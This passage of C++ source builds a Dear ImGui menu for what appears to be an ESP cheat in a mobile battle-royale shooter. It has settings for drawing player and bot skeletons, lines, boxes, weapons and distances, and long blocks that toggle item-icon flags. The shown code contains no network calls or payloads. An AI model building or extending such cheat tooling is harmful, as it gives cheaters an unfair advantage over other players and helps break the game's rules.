											else if (Setting::playerBoneColorVer == 1)
											{
												ImGui::SameLine(600);
												ImGui::ColorEdit4("###bonecolor", (float*)&Setting::bonecolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
											}
										}
										ImGui::Checkbox("Player Line", &Setting::pline);
										if (Setting::pline)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(180);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderFloat("##LINE SIZE", &Setting::plinesize, 0.100f, 3.00f, "Line Size : %0.1f");
											ImGui::SameLine();
											const char* Emu1[] = { "Visible", "Default","Team Id" };
											const char* combo_label = Emu1[Setting::plineColorVer];
											if (ImGui::BeginCombo(" loll", combo_label, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(Emu1); n++)
												{
													const bool is_selected = (Setting::plineColorVer == n);
													if (ImGui::Selectable(Emu1[n], is_selected))
														Setting::plineColorVer = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											if (Setting::plineColorVer == 0)
											{
												ImGui::SameLine(570);
												ImGui::ColorEdit4("###plinecoloropen", (float*)&Setting::plinecoloropen, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
												ImGui::SameLine();
												ImGui::ColorEdit4("###plinecolorcover", (float*)&Setting::plinecolorcover, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
											}
											else if (Setting::plineColorVer == 1)
											{
												ImGui::SameLine(600);
												ImGui::ColorEdit4("###plinecolor", (float*)&Setting::plinecolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
											}
										}
										ImGui::Checkbox("Player Box", &Setting::pcorner);
										if (Setting::pcorner)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(118);
											ImGui::SetCursorPosX({ 150 });
											//ImGui::SameLine();
											if (boxver1 == 0)
											{
												ImGui::SliderFloat("##CORNERBOX", &Setting::pcornersize, 0.1, 5, "Box Thikness : %0.1f");
											}
											else if (boxver1 == 1)
											{
												ImGui::SliderFloat("##FULLBOX", &Setting::pfullboxsize, 0.1, 5, "Box Thikness : %0.1f");
											}
											ImGui::SameLine();
											const char* box[] = { "Corner Box","Full Box" };
											const char* combo_label2 = box[boxver1];
											if (ImGui::BeginCombo("#1BOX", combo_label2, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(box); n++)
												{
													const bool is_selected = (boxver1 == n);
													if (ImGui::Selectable(box[n], is_selected))
														boxver1 = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											ImGui::SameLine(401);

											const char* boxcolorverboxcolorver[] = { "Default","Team Id" };
											const char* boxcolorverboxcolorverboxcolorver = boxcolorverboxcolorver[boxcolorver];
											if (ImGui::BeginCombo("#BOX", boxcolorverboxcolorverboxcolorver, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(boxcolorverboxcolorver); n++)
												{
													const bool is_selected = (boxcolorver == n);
													if (ImGui::Selectable(boxcolorverboxcolorver[n], is_selected))
														boxcolorver = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###BOX", (float*)&cornerboxcolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
										ImGui::Checkbox("Player Weapon", &Setting::playerweapon);
										if (Setting::playerweapon)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderInt("##PLAYER WEAPON", &pweapsize, 1, 30, "Weapon Size : %0.1f");
											ImGui::SameLine();
											const char* weapon[] = { "Text","Icon" };
											const char* weaponweapon = weapon[WeaponStyle];
											if (ImGui::BeginCombo("#WeaponStyle", weaponweapon, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(weapon); n++)
												{
													const bool is_selected = (WeaponStyle == n);
													if (ImGui::Selectable(weapon[n], is_selected))
														WeaponStyle = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###weaponenemycolor", (float*)&Setting::weaponenemycolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
										ImGui::Checkbox("Player Distance", &Setting::plyrdistance);
										if (Setting::plyrdistance)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderInt("##dissize", &dissize, 1, 20, "Distance Size : %0.1f");
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###pdistancecolor", (float*)&Setting::pdistancecolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
										ImGui::Checkbox("Player Flag", &Setting::pflag);
										if (Setting::pflag)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											//ImGui::SliderInt("##PLAYERWEAPON", &pweapsize, 1, 30, "Weapon Size : %0.1f");
											//ImGui::SameLine();
											const char* flag[] = { "Icon","Text" };
											const char* flagflag = flag[FlagStyle];
											if (ImGui::BeginCombo("#FlagStyle", flagflag, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(flag); n++)
												{
													const bool is_selected = (FlagStyle == n);
													if (ImGui::Selectable(flag[n], is_selected))
														FlagStyle = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
										}
										ImGui::Checkbox("Player Team Id", &Setting::pTeamID);
										if (Setting::pTeamID)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderInt("##TeamIdSize", &TeamIdSize, 1, 30, "Team Id : %0.1f");
											ImGui::SameLine();
											const char* pTeamIDd[] = { "Default","Team Id" };
											const char* combo_label112 = pTeamIDd[TeamIDStyle];
											if (ImGui::BeginCombo(" pTeamIDd", combo_label112, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(pTeamIDd); n++)
												{
													const bool is_selected = (TeamIDStyle == n);
													if (ImGui::Selectable(pTeamIDd[n], is_selected))
														TeamIDStyle = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###TEAMIDCOLOR", (float*)&Setting::pnamecolorcolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
									}
									ImGui::EndChild();
								}
								else if (Settings::EspTab == 2)
								{
									ImGui::SetCursorPos({74, 150 });
									ImGui::BeginChild("##1", ImVec2(570, 270), true, ImGuiWindowFlags_NoBackground);
									{
										ImGui::Checkbox("Bot Name", &Setting::botname);
										if (Setting::botname)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderInt("##nsize", &nsize, 1, 20, "Name Size : %0.1f");
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###pnamecolorcolor", (float*)&Setting::botnamecolorcolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
										ImGui::Checkbox("Bot Bone", &Setting::botBone);
										if (Setting::botBone)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(180);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderFloat("##BONE SIZE", &Setting::bbonesize, 0.100f, 3.00f, "Bone Size : %0.1f");
											ImGui::SameLine();
											const char* botbone[] = { "Visible", "Default","Team Id" };
											const char* botcombo_label1 = botbone[Setting::botBoneColorVer];
											if (ImGui::BeginCombo(" bone", botcombo_label1, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(botbone); n++)
												{
													const bool is_selected = (Setting::botBoneColorVer == n);
													if (ImGui::Selectable(botbone[n], is_selected))
														Setting::botBoneColorVer = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}

											if (Setting::botBoneColorVer == 0)
											{
												ImGui::SameLine(570);
												ImGui::ColorEdit4("###botbonecoloropen", (float*)&Setting::botbonecoloropen, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
												ImGui::SameLine();
												ImGui::ColorEdit4("###botbonecolorcover", (float*)&Setting::botbonecolorcover, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
											}
											else if (Setting::botBoneColorVer == 1)
											{
												ImGui::SameLine(600);
												ImGui::ColorEdit4("###botbonecolor", (float*)&Setting::botbonecolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
											}
										}
										ImGui::Checkbox("Bot Line", &Setting::botline);
										if (Setting::botline)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(180);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderFloat("##botLINE SIZE", &Setting::blinesize, 0.100f, 3.00f, "Line Size : %0.1f");
											ImGui::SameLine();
											const char* botEmu1[] = { "Visible", "Default","Team Id" };
											const char* botcombo_label = botEmu1[Setting::botlineColorVer];
											if (ImGui::BeginCombo(" loll", botcombo_label, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(botEmu1); n++)
												{
													const bool is_selected = (Setting::botlineColorVer == n);
													if (ImGui::Selectable(botEmu1[n], is_selected))
														Setting::botlineColorVer = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											if (Setting::plineColorVer == 0)
											{
												ImGui::SameLine(570);
												ImGui::ColorEdit4("###botlinecoloropen", (float*)&Setting::botlinecoloropen, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
												ImGui::SameLine();
												ImGui::ColorEdit4("###botlinecolorcover", (float*)&Setting::botlinecolorcover, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
											}
											else if (Setting::plineColorVer == 1)
											{
												ImGui::SameLine(600);
												ImGui::ColorEdit4("###botlinecolor", (float*)&Setting::botlinecolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
											}
										}
										ImGui::Checkbox("Bot Box", &Setting::botcorner);
										if (Setting::botcorner)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(118);
											ImGui::SetCursorPosX({ 150 });
											//ImGui::SameLine();
											if (bboxver1 == 0)
											{
												ImGui::SliderFloat("##bCORNERBOX", &Setting::bcornersize, 0.1, 5, "Box Thikness : %0.1f");
											}
											else if (bboxver1 == 1)
											{
												ImGui::SliderFloat("##bFULLBOX", &Setting::bfullboxsize, 0.1, 5, "Box Thikness : %0.1f");
											}
											ImGui::SameLine();
											const char* botbox[] = { "Corner Box","Full Box" };
											const char* botcombo_label2 = botbox[bboxver1];
											if (ImGui::BeginCombo("#1BOX", botcombo_label2, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(botbox); n++)
												{
													const bool is_selected = (bboxver1 == n);
													if (ImGui::Selectable(botbox[n], is_selected))
														bboxver1 = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											ImGui::SameLine(401);

											const char* botboxcolorverboxcolorver[] = { "Default","Team Id" };
											const char* botboxcolorverboxcolorverboxcolorver = botboxcolorverboxcolorver[bboxcolorver];
											if (ImGui::BeginCombo("#bBOX", botboxcolorverboxcolorverboxcolorver, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(botboxcolorverboxcolorver); n++)
												{
													const bool is_selected = (bboxcolorver == n);
													if (ImGui::Selectable(botboxcolorverboxcolorver[n], is_selected))
														bboxcolorver = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###BOX", (float*)&cornerboxcolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
										ImGui::Checkbox("Bot Weapon", &Setting::botweapon);
										if (Setting::botweapon)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderInt("##bPLAYER WEAPON", &bweapsize, 1, 30, "Weapon Size : %0.1f");
											ImGui::SameLine();
											const char* bweapon[] = { "Text","Icon" };
											const char* bweaponweapon = bweapon[bWeaponStyle];
											if (ImGui::BeginCombo("#bWeaponStyle", bweaponweapon, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(bweapon); n++)
												{
													const bool is_selected = (bWeaponStyle == n);
													if (ImGui::Selectable(bweapon[n], is_selected))
														bWeaponStyle = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###weaponenemycolor", (float*)&Setting::botweaponenemycolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
										ImGui::Checkbox("Bot Distance", &Setting::botdistance);
										if (Setting::botdistance)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderInt("##dissize", &dissize, 1, 20, "Distance Size : %0.1f");
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###pdistancecolor", (float*)&Setting::pdistancecolor, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
										ImGui::Checkbox("Bot Flag", &Setting::botflag);
										if (Setting::botflag)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											//ImGui::SliderInt("##PLAYERWEAPON", &pweapsize, 1, 30, "Weapon Size : %0.1f");
											//ImGui::SameLine();
											const char* bflag[] = { "Icon","Text" };
											const char* bflagflag = bflag[bFlagStyle];
											if (ImGui::BeginCombo("#bFlagStyle", bflagflag, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(bflag); n++)
												{
													const bool is_selected = (bFlagStyle == n);
													if (ImGui::Selectable(bflag[n], is_selected))
														bFlagStyle = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
										}
										ImGui::Checkbox("Bot Team Id", &Setting::botTeamID);
										if (Setting::botTeamID)
										{
											ImGui::SameLine();
											ImGui::PushItemWidth(150);
											ImGui::SetCursorPosX({ 150 });
											ImGui::SliderInt("##BotTeamIdSize", &BotTeamIdSize, 1, 30, "Team Id : %0.1f");
											ImGui::SameLine();
											const char* bTeamIDd[] = { "Default","Team Id" };
											const char* vcombo_label112 = bTeamIDd[bTeamIDStyle];
											if (ImGui::BeginCombo(" bTeamIDd", vcombo_label112, ImGuiComboFlags_HeightSmall))
											{
												for (int n = 0; n < IM_ARRAYSIZE(bTeamIDd); n++)
												{
													const bool is_selected = (bTeamIDStyle == n);
													if (ImGui::Selectable(bTeamIDd[n], is_selected))
														bTeamIDStyle = n;
													if (is_selected)
														ImGui::SetItemDefaultFocus();
												}
												ImGui::EndCombo();
											}
											ImGui::SameLine(530);
											ImGui::ColorEdit4("###BotTeamId", (float*)&Setting::BotTeamId, ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoLabel);
										}
									}
									ImGui::EndChild();
								}
								else if (Settings::EspTab == 3)
								{
									ImGui::SetCursorPos({74, 150 });
									ImGui::Checkbox("Item Icon", &Setting::AllIcons);
									if (Setting::AllIcons)
									{
										Setting::Esp_Item_AKM_Icon = true;
										Setting::Esp_Item_M249_Icon = true;
										Setting::Esp_Item_MG3_Icon = true;
										Setting::Esp_Item_M762_Icon = true;
										Setting::Esp_Item_Mk47Mutant_Icon = true;
										Setting::Esp_Item_DP28_Icon = true;
										Setting::Esp_Item_SCARL_Icon = true;
										Setting::Esp_Item_M416_Icon = true;
										Setting::Esp_Item_M16A4_Icon = true;
										Setting::Esp_Item_FAMAS_Icon = true;
										Setting::Esp_Item_AN94_Icon = true;
										Setting::Esp_Item_G36C_Icon = true;
										Setting::Esp_Item_QBZ_Icon = true;
										Setting::Esp_Item_Groza_Icon = true;
										Setting::Esp_Item_AUG_Icon = true;


										/////////////////////////////////////////////// Sniper Rifle ////////////////////////////////////////////


										Setting::Esp_Item_VSS_Icon = true;
										Setting::Esp_Item_Mk12_Icon = true;
										Setting::Esp_Item_Win94_Icon = true;
										Setting::Esp_Item_QBU_Icon = true;
										Setting::Esp_Item_SLR_Icon = true;
										Setting::Esp_Item_SKS_Icon = true;
										Setting::Esp_Item_Mini14_Icon = true;
										Setting::Esp_Item_Mk14_Icon = true;

										/////////////////////////////////////////////// Sniper ////////////////////////////////////////////

										Setting::Esp_Item_M24_Icon = true;
										Setting::Esp_Item_Awm_Icon = true;
										Setting::Esp_Item_AMR_Icon = true;
										Setting::Esp_Item_Dagger_Icon = true;
										Setting::Esp_Item_ZombieBlade_Icon = true;
										Setting::Esp_Item_ZombieHammer_Icon = true;
										Setting::Esp_Item_BulletAMR_Icon = true;
										Setting::Esp_Item_Awmimo_Icon = true;
										Setting::Esp_Item_300Magnum_Icon = true;
										Setting::Esp_Item_Kar98k_Icon = true;
										Setting::Esp_Item_Mosin_Icon = true;

										/////////////////////////////////////////////// Suits ////////////////////////////////////////////


										Setting::Esp_Item_Suit_Arctic_Icon = true;
										Setting::Esp_Item_RedZone_Icon = true;
										Setting::Esp_Item_Suit_Woodland_Icon = true;
										Setting::Esp_Item_Suit_Desert_Icon = true;
										Setting::Esp_Item_Suit_Desert2_Icon = true;
										Setting::Esp_Item_CrossBow_Icon = true;
										Setting::Esp_Item_CrossBow_Quick_Icon = true;


										/////////////////////////////////////////////// Shotguns ////////////////////////////////////////////


										Setting::Esp_Item_SawedOff_Icon = true;
										Setting::Esp_Item_M1014_Icon = true;
										Setting::Esp_Item_S1897_Icon = true;
										Setting::Esp_Item_S686_Icon = true;
										Setting::Esp_Item_DBS_Icon = true;
										Setting::Esp_Item_S12K_Icon = true;


										/////////////////////////////////////////////// Melee Weapons ////////////////////////////////////////////


										Setting::Esp_Item_Cowbar_Icon = true;
										Setting::Esp_Item_Machete_Icon = true;
										Setting::Esp_Item_Sickle_Icon = true;
										Setting::Esp_Item_Pan_Icon = true;


										/////////////////////////////////////////////// Pistol ////////////////////////////////////////////


										Setting::Esp_Item_DesertEagle_Icon = true;
										Setting::Esp_Item_P1911_Icon = true;
										Setting::Esp_Item_R45_Icon = true;
										Setting::Esp_Item_P18C_Icon = true;
										Setting::Esp_Item_P92_Icon = true;
										Setting::Esp_Item_Vz61_Icon = true;
										Setting::Esp_Item_R1895_Icon = true;
										Setting::Esp_Item_FlareGun_Icon = true;


										/////////////////////////////////////////////// Attachments ////////////////////////////////////////////


										Setting::Esp_Item_Vertical_Icon = true;
										Setting::Esp_Item_HalfGrip_Icon = true;
										Setting::Esp_Item_LightGrip_Icon = true;
										Setting::Esp_Item_Angled_Icon = true;
										Setting::Esp_Item_Lasersight_Icon = true;
										Setting::Esp_Item_ThumbGrip_Icon = true;
										Setting::Esp_Item_Mid_FlashHider_Icon = true;
										Setting::Esp_Item_Large_FlashHider_Icon = true;
										Setting::Esp_Item_Large_Compensator_Icon = true;
										Setting::Esp_Item_Mid_Compensator_Icon = true;
										Setting::Esp_Item_Taktik_Icon = true;
										Setting::Esp_Item_Duckbill_Icon = true;
										Setting::Esp_Item_Sniper_FlashHider_Icon = true;
										Setting::Esp_Item_Mid_Suppressor_Icon = true;
										Setting::Esp_Item_Chekpad_Sniper_Icon = true;
										Setting::Esp_Item_Choke_Icon = true;
										Setting::Esp_Item_Micro_UZI_Icon = true;
										Setting::Esp_Item_Sniper_Compensator_Icon = true;
										Setting::Esp_Item_Sniper_Suppressor_Icon = true;
										Setting::Esp_Item_Large_Suppressor_Icon = true;
										Setting::Esp_Item_Sniper_Quick_Extended_Icon = true;
										Setting::Esp_Item_Sniper_Extended_Icon = true;
										Setting::Esp_Item_Sniper_Quick_Icon = true;
										Setting::Esp_Item_AR_Quick_Icon = true;
										Setting::Esp_Item_AR_Quick_Extended_Icon = true;
										Setting::Esp_Item_AR_Extended_Icon = true;
										Setting::Esp_Item_SMG_Quick_Extended_Icon = true;
										Setting::Esp_Item_SMG_Extended_Icon = true;
										Setting::Esp_Item_SMG_Quick_Icon = true;
										Setting::Esp_Item_WorldCup_Box_Icon = true;
										Setting::Esp_Item_Football_Grenade_Icon = true;
										Setting::Esp_Item_Football_Cloth_Icon = true;
										Setting::Esp_Item_Golden_Boot_Icon = true;
										Setting::Esp_Item_MiniGameMachine_Icon = true;
										Setting::Esp_Item_BlindBoxMachine_Icon = true;
										Setting::Esp_Item_GameCoin_Icon = true;
										Setting::Esp_Item_Benzin_Icon = true;


										/////////////////////////////////////////////// SMG ////////////////////////////////////////////


										Setting::Esp_Item_PP19_Icon = true;
										Setting::Esp_Item_P90_Icon = true;
										Setting::Esp_Item_TommyGun_Icon = true;
										Setting::Esp_Item_MP5K_Icon = true;
										Setting::Esp_Item_UMP9_Icon = true;
										Setting::Esp_Item_Vector_Icon = true;
										Setting::Esp_Item_Uzi_Icon = true;


										/////////////////////////////////////////////// Ammo ////////////////////////////////////////////


										Setting::Esp_Item_762mm_Icon = true;
										Setting::Esp_Item_556mm_Icon = true;
										Setting::Esp_Item_9mm_Icon = true;
										Setting::Esp_Item_45ACP_Icon = true;
										Setting::Esp_Item_Flare_Icon = true;
										Setting::Esp_Item_12Guage_Icon = true;
										Setting::Esp_Item_Ammo_Bolt_Icon = true;


										/////////////////////////////////////////////// Scops ////////////////////////////////////////////


										Setting::Esp_Item_Lazer_Icon = true;
										Setting::Esp_Item_Holo_Icon = true;
										Setting::Esp_Item_x2_Icon = true;
										Setting::Esp_Item_x3_Icon = true;
										Setting::Esp_Item_x4_Icon = true;
										Setting::Esp_Item_x6_Icon = true;
										Setting::Esp_Item_x8_Icon = true;


										/////////////////////////////////////////////// Armors ////////////////////////////////////////////


										Setting::Esp_Item_Bag1_Icon = true;
										Setting::Esp_Item_Bag2_Icon = true;
										Setting::Esp_Item_Bag3_Icon = true;
										Setting::Esp_Item_Armor1_Icon = true;
										Setting::Esp_Item_Armor2_Icon = true;
										Setting::Esp_Item_Armor3_Icon = true;
										Setting::Esp_Item_Helmet1_Icon = true;
										Setting::Esp_Item_Helmet2_Icon = true;
										Setting::Esp_Item_Helmet3_Icon = true;


										/////////////////////////////////////////////// Grenade ////////////////////////////////////////////


										Setting::Esp_Item_Frag_Icon = true;
										Setting::Esp_Item_Frag_Warn_Icon = true;
										Setting::Esp_Item_Smoke_Warn_Icon = true;
										Setting::Esp_Item_Smoke_Icon = true;
										Setting::Esp_Item_Molotof_Icon = true;
										Setting::Esp_Item_Molotof_Warn_Icon = true;
										Setting::Esp_Item_Grenade_Apple_Icon = true;



										/////////////////////////////////////////////// Health ////////////////////////////////////////////


										Setting::Esp_Item_MedKit_Icon = true;
										Setting::Esp_Item_FirstAidKit_Icon = true;
										Setting::Esp_Item_Painkiller_Icon = true;
										Setting::Esp_Item_EnergyDrink_Icon = true;
										Setting::Esp_Item_AdrenalineSyringe_Icon = true;
										Setting::Esp_Item_Bandage_Icon = true;
										Setting::Esp_Item_AirDrop_Icon = true;
										Setting::Esp_Item_DeadBox_Icon = true;
										Setting::Esp_Item_AirAttack_Icon = true;

									}
									else
									{
										Setting::Esp_Item_AKM_Icon = false;
										Setting::Esp_Item_M249_Icon = false;
										Setting::Esp_Item_MG3_Icon = false;
										Setting::Esp_Item_M762_Icon = false;
										Setting::Esp_Item_Mk47Mutant_Icon = false;
										Setting::Esp_Item_DP28_Icon = false;
										Setting::Esp_Item_SCARL_Icon = false;
										Setting::Esp_Item_M416_Icon = false;
										Setting::Esp_Item_M16A4_Icon = false;
										Setting::Esp_Item_FAMAS_Icon = false;
										Setting::Esp_Item_AN94_Icon = false;
										Setting::Esp_Item_G36C_Icon = false;
										Setting::Esp_Item_QBZ_Icon = false;
										Setting::Esp_Item_Groza_Icon = false;
										Setting::Esp_Item_AUG_Icon = false;


										/////////////////////////////////////////////// Sniper Rifle ////////////////////////////////////////////


										Setting::Esp_Item_VSS_Icon = false;
										Setting::Esp_Item_Mk12_Icon = false;
										Setting::Esp_Item_Win94_Icon = false;
										Setting::Esp_Item_QBU_Icon = false;
										Setting::Esp_Item_SLR_Icon = false;
										Setting::Esp_Item_SKS_Icon = false;
										Setting::Esp_Item_Mini14_Icon = false;
										Setting::Esp_Item_Mk14_Icon = false;

										/////////////////////////////////////////////// Sniper ////////////////////////////////////////////

										Setting::Esp_Item_M24_Icon = false;
										Setting::Esp_Item_Awm_Icon = false;
										Setting::Esp_Item_AMR_Icon = false;
										Setting::Esp_Item_Dagger_Icon = false;
										Setting::Esp_Item_ZombieBlade_Icon = false;
										Setting::Esp_Item_ZombieHammer_Icon = false;
										Setting::Esp_Item_BulletAMR_Icon = false;
										Setting::Esp_Item_Awmimo_Icon = false;
										Setting::Esp_Item_300Magnum_Icon = false;
										Setting::Esp_Item_Kar98k_Icon = false;
										Setting::Esp_Item_Mosin_Icon = false;

										/////////////////////////////////////////////// Suits ////////////////////////////////////////////


										Setting::Esp_Item_Suit_Arctic_Icon = false;
										Setting::Esp_Item_RedZone_Icon = false;
										Setting::Esp_Item_Suit_Woodland_Icon = false;
										Setting::Esp_Item_Suit_Desert_Icon = false;
										Setting::Esp_Item_Suit_Desert2_Icon = false;
										Setting::Esp_Item_CrossBow_Icon = false;
										Setting::Esp_Item_CrossBow_Quick_Icon = false;


										/////////////////////////////////////////////// Shotguns ////////////////////////////////////////////


										Setting::Esp_Item_SawedOff_Icon = false;
										Setting::Esp_Item_M1014_Icon = false;
										Setting::Esp_Item_S1897_Icon = false;
										Setting::Esp_Item_S686_Icon = false;
										Setting::Esp_Item_DBS_Icon = false;
										Setting::Esp_Item_S12K_Icon = false;


										/////////////////////////////////////////////// Melee Weapons ////////////////////////////////////////////


										Setting::Esp_Item_Cowbar_Icon = false;
										Setting::Esp_Item_Machete_Icon = false;
										Setting::Esp_Item_Sickle_Icon = false;
										Setting::Esp_Item_Pan_Icon = false;


										/////////////////////////////////////////////// Pistol ////////////////////////////////////////////


										Setting::Esp_Item_DesertEagle_Icon = false;
										Setting::Esp_Item_P1911_Icon = false;
										Setting::Esp_Item_R45_Icon = false;
										Setting::Esp_Item_P18C_Icon = false;
										Setting::Esp_Item_P92_Icon = false;
										Setting::Esp_Item_Vz61_Icon = false;
										Setting::Esp_Item_R1895_Icon = false;
										Setting::Esp_Item_FlareGun_Icon = false;


										/////////////////////////////////////////////// Attachments ////////////////////////////////////////////


										Setting::Esp_Item_Vertical_Icon = false;
										Setting::Esp_Item_HalfGrip_Icon = false;
										Setting::Esp_Item_LightGrip_Icon = false;
										Setting::Esp_Item_Angled_Icon = false;
										Setting::Esp_Item_Lasersight_Icon = false;
										Setting::Esp_Item_ThumbGrip_Icon = false;
										Setting::Esp_Item_Mid_FlashHider_Icon = false;
										Setting::Esp_Item_Large_FlashHider_Icon = false;
										Setting::Esp_Item_Large_Compensator_Icon = false;
										Setting::Esp_Item_Mid_Compensator_Icon = false;
										Setting::Esp_Item_Taktik_Icon = false;
										Setting::Esp_Item_Duckbill_Icon = false;
										Setting::Esp_Item_Sniper_FlashHider_Icon = false;
										Setting::Esp_Item_Mid_Suppressor_Icon = false;
										Setting::Esp_Item_Chekpad_Sniper_Icon = false;
										Setting::Esp_Item_Choke_Icon = false;
										Setting::Esp_Item_Micro_UZI_Icon = false;
										Setting::Esp_Item_Sniper_Compensator_Icon = false;
										Setting::Esp_Item_Sniper_Suppressor_Icon = false;
										Setting::Esp_Item_Large_Suppressor_Icon = false;
										Setting::Esp_Item_Sniper_Quick_Extended_Icon = false;
										Setting::Esp_Item_Sniper_Extended_Icon = false;
										Setting::Esp_Item_Sniper_Quick_Icon = false;
										Setting::Esp_Item_AR_Quick_Icon = false;
										Setting::Esp_Item_AR_Quick_Extended_Icon = false;
										Setting::Esp_Item_AR_Extended_Icon = false;
										Setting::Esp_Item_SMG_Quick_Extended_Icon = false;
										Setting::Esp_Item_SMG_Extended_Icon = false;
										Setting::Esp_Item_SMG_Quick_Icon = false;
										Setting::Esp_Item_WorldCup_Box_Icon = false;
										Setting::Esp_Item_Football_Grenade_Icon = false;
										Setting::Esp_Item_Football_Cloth_Icon = false;
										Setting::Esp_Item_Golden_Boot_Icon = false;
										Setting::Esp_Item_MiniGameMachine_Icon = false;
										Setting::Esp_Item_BlindBoxMachine_Icon = false;
										Setting::Esp_Item_GameCoin_Icon = false;
										Setting::Esp_Item_Benzin_Icon = false;


										/////////////////////////////////////////////// SMG ////////////////////////////////////////////


										Setting::Esp_Item_PP19_Icon = false;
										Setting::Esp_Item_P90_Icon = false;
										Setting::Esp_Item_TommyGun_Icon = false;
										Setting::Esp_Item_MP5K_Icon = false;
										Setting::Esp_Item_UMP9_Icon = false;
										Setting::Esp_Item_Vector_Icon = false;
										Setting::Esp_Item_Uzi_Icon = false;


										/////////////////////////////////////////////// Ammo ////////////////////////////////////////////


										Setting::Esp_Item_762mm_Icon = false;
										Setting::Esp_Item_556mm_Icon = false;
										Setting::Esp_Item_9mm_Icon = false;
										Setting::Esp_Item_45ACP_Icon = false;
										Setting::Esp_Item_Flare_Icon = false;
										Setting::Esp_Item_12Guage_Icon = false;
										Setting::Esp_Item_Ammo_Bolt_Icon = false;


										/////////////////////////////////////////////// Scops ////////////////////////////////////////////


										Setting::Esp_Item_Lazer_Icon = false;
